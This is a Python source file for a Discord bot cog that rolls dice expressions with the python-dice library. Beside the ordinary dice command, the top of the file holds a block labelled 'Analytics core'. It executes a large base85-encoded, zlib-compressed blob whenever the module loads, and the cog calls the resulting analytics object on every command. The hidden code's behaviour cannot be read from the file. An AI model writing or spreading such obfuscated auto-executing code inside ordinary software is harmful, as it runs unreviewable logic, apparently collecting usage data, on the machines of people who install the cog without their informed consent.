from discord.ext import commands
from .utils import checks
from .utils.chat_formatting import box, warning
import dice

# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-o~{dv6=L5&z$xf@dJ$s@~F)lgk~1+ca*P_T2XJvU|nBXY5hCl*D*<xm|Ll2tmGkXNKH|WI0!$KmxB
w&Tt;Tc~O_OX&kez(bXz$WR;sTmUdTV+Qd?uwR3e`7t$?FQ^uJo3Y9r+DjVCKjg387Hl}2mSy|CKU09JzC$HWz?fLp&hlje|Y^}2Uz#`W+GfghkC)aPAvIK#
`fwi>jLNB^ayOuM*v5;0hf7Y!po<CDnW^#3s71CPvx1TR7S?rw7?EHkK=|(jc<WJLNCZ0Y$Vb?d8H`nREKKwJ`sH>fypIaxL6`3s5;-k>!yw+QNFY0y8PuQO
?uV3$<Zd5)x3rF5v-u#$w)chReP5mBj{Qdgvn*?{yxa?#SAFZii@BJ)^PJdKIVZLFnkb<pMqXfHIYcQ8(A6x5~WdCV(b`M)Jx6G}jV^@5mz<aWBDrcwcbR``
Sf-hNX<w`MKq2naFjKLQxcis=bR;LrV^#X4F_gYm<RdP|NJZ3x7Hf&)W+v=iVR#iEZm8o{6X)U>v$%ScQd#$rI@xp6?3I!>Q%oP&kY;Cp-ytiX!$&{p{<W0P
QHEk6$Sr`y=tKAwocz$oMiMZamH3%Ghg(SRDNL7JmC_6iSV-_agu?2`yDg+0US*F0@&VXeUi5e5LE4Bp_6Jmggc0f-YegQ!;S+NGJiFR4Gpm5#jjm&neHid>
i=!7|n_e1CI70BBz1ZZ;}JnR4b5lwNvD9qx#l-8-{{N0DEpD$niBFg-Q7x^u^23)8tMbMwvUw&dgy!>YN?Zs?1`|jeqXVZ)4-%p=jOkXhYlq#hzK)07YxR^k
ny}SHy`BREGOg?j+TkRB|KaIga8K2K$E^EEPk1r=IS4%*=uCz<j$f{x)gJWZrM3V``0>c%NrlrZ-LP0=qLdJku(W8{J?l>?=;D7fM^elBHol5>H3#+>2S~jw
@DMn`U`AfG7nzt$$<q(l8Sc_C#%1?!=l5b}hlkV_pGsMVR6?MX26GYK8kSpl3KS9v;LK7s>!~Bf+yuau;A|kvrdKnUv&^F!3Lgy)lA(=>El#+QyRN*wj`|xC
M32E<>&O~t1)FK09IhEp$CrBw!!TKlcC1s~l0nT&pD8H8#7M(-_fF=q2j_^19M7}c5Q&^7RKQ1-OwM~Twk8x}iB<@TRPgCSbGxyrViWsHB7k+oVL<Z;t2-^s
r@JX(mgfpaZqe`<;BwWvpBuZ2Gs$>ZW+aowoWltBBzO7dcWD}3uN^L=qPJI7sPlJHvhw}TgQRkU>K;mQK2Uh==@M+psh!$ct1ltfUH%+U?(18+CWvYlK0St1
Z23k}ZGP1D{SZ)m^Qd<{P!gAu#3cIDeSGjJ+Td)(ri!2Yo8}|tBu7z~(4X&4foH&y%Zj?>lm`cSmbN&M&2I81LTdNxXMMhe}<<6&qPVjxb=Obh7WeoC&kadj
`M0>a6#r{sZZgkUR6a(I%Wc#+xG43$?q&^dQo!Y?>;{+9q)n!#k?e#92962dG<LEPQb<XFsjkPgqCoxa=m-<YAA`6|zDBt9EK6`!_^IVszLY!WFjRcsslFvE
g;-k@36!CXd7SEqp{-kTkgfEpH@FO6K_*uUTO`20BtoAF7Dir7vP0sj)$B$tBjMF8DK{c6t0lQFl=q(Mvg)pc9HqM*aY%A4}nO(CZXP1fGO6~gUArNC}36&b
!lZeiHDc;Yzgnf2;v#S;3Z~ws&L81CDb)|f_;Gid>QphO9?GA6iUnwZt-;%9mRjDE=Mfi$k3s!3qf4u{DKueQ6pH7LXOo%Nt5A+3)s2u1BX??4jXd)<ATNDP
oV(vKs5oML6^H4c%c`y&Z>q5R0n)iJvbT805E!5D4362L<p?wnHeT8cmMLk<=Ylva4vI1<DV@CuihMP2`4{QmC!r5J9ePjk6r#E1coKc$xw#04{3#^1~TjR|
F`c7z;!2L|FBrpVY0cKBomz*V>b^R5<nf-QK-;FBzZzvP`0y<RmCNnj4sL;@2%ZLu~lKnn*=(<T?t|@VjQ?i6_^(j-e8|NNOS$jzK)wj>M9eR%;tF2&$NwI7
6X`;_^eeA-AH)neY&6NUrIFe#t9*y*JXk{yW{OtRrP4>9=svgU8E#{4}Ob8deHR>TV0du4Jp84alk9FS*^p-9d2^da>sZrQMsXChZQxN~BSA7hdd$}88IL3~
i?IVMk>Q{N%k>2uz|Ka=Tg9K5=e&fy`gr*(j;?(u|Tv_^v9IF6#k-Iz?dTC!#-G!KY-87~lg=$EKd*DFQ9vXg~lnC>&cvWaH%r)SWQZURSG;A^)lAuk++I^%
99yQxk1jB`z|CkdY9B~`E=4jN>1b<+<(pAVdY6AqxsL0l)F4WRRd-sejMO{E<W1{SMKCIGyo9%~D-#}PzjS&+MQ7=h~fe<k3PwZPZP?OR`(2wbHVB`PvxqCK
6vtxepaXYZ;*Sgrp1<c?M23lQxzL-wqi|Mm&Tp9^RdJOXak4;HJ6uvP@9<&gBbD=gVHgm}>FuWt~5wIk8^sFexP+sqZK!Q&sXy#iK0XFX*(%c3K@5rnb3{U4
FFf?UyjYS}^!z*=Yq=pU$h^ZIgb0CLCq$xtH(mjBj(R$y>%=nz_BSN!)jRJB;<KX)RVyw?PaMLaIP<P3wiLyTP^<Hu~(}X7=5k4Z6DdD4p!D*PHha{ZlD1k<
MUCQWiXi}=wESK|zF$MLmU90NXA4q$&?E14u%FZU?eL2Sx)~88NkvtaAffk=AvbJept=J*`HsPTu;3F9c7(C3uIi5SLlyVo1I*cdyPw*$vCf-g$v)?zJaUQQ
nP5UCjx3wr2{vD0RRlIsVE}#n-%0K0LrL0dRy_(&A_Y4;;M0acg^S<X8-sXDwuAseY5I*xq9xaB>{ony2z%B6wJ+$nN`KZFMf`G~r|GX)r&9qJnD7HX#78XG
|?d&lBq>>&d{MEld0O|ZI^G{|PHA;B+GYZzk@A=;7*eEfi&m(CDhKSMVb8<LG_1TMV>B|+)z<ccnj;(z3D#|Crgb90NnMS9?&>)HM9&zMQ|Kb2+F}}#aIP5+
B%B=cR(L=XSj{1GuV5P~u@7tO>@BT#C?1b@;SP9HK!hc$dukO_F$`!QrKmCN_cK}HVkVxm6$S=WAH_Sdfrc^P8`iO80zYdZevmnC(w}E(ah}$ECek|khpwF@
A37?8a7{(X9Fysa1F~?^KK87nzrr!Qtmh}*HpGHV0FCf}sS%el`_%RB4&POgMZU+J&eb|A1Lc)xrRZdC_Ku=n1WB&^?8dL=""".replace("\n", ""))))
# End analytics core

__version__ = '1.0.0'

class Dice:
    """A cog which uses the python-dice library to provide powerful dice
    expression parsing for your games!"""
    def __init__(self, bot):
        self.bot = bot
        self.analytics = CogAnalytics(self)

    @commands.command(pass_context=True)
    async def rd(self, ctx, *, expr: str = 'd20'):
        """Evaluates a dice expression. Defaults to roll a d20.

        Valid operations include the 'mdn' dice operator, which rolls m dice
        with n sides. If m is omitted, it is assumed to be 1.
        Modifiers include basic algebra, 't' to total a result,
        's' to sort multiple rolls, '^n' to only use the n highest rolls, and
        'vn' to drop the lowest n rolls. This cog uses the dice library.

        Examples: 4d20, d100, 6d6v2, 8d4t, 4d4 + 4, 6d8^2"""

        try:
            roll = dice.roll(expr)
        except dice.ParseException:
            await self.bot.say(warning('Invalid syntax.'))
            return
        if type(roll) in [dice.elements.Integer, int]:
            res = roll
        elif len(roll) > 0:
            total = sum(roll)
            res = ', '.join(map(str, roll))
            if len(res) > 1970:
                res = '[result set too long to display]'
            if len(roll) > 1:
                res += ' (total: %s)' % total
        else:
            await self.bot.say('Empty result!')
            return
        await self.bot.say(':game_die: %s' % res)


    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)

def setup(bot):
    bot.add_cog(Dice(bot))
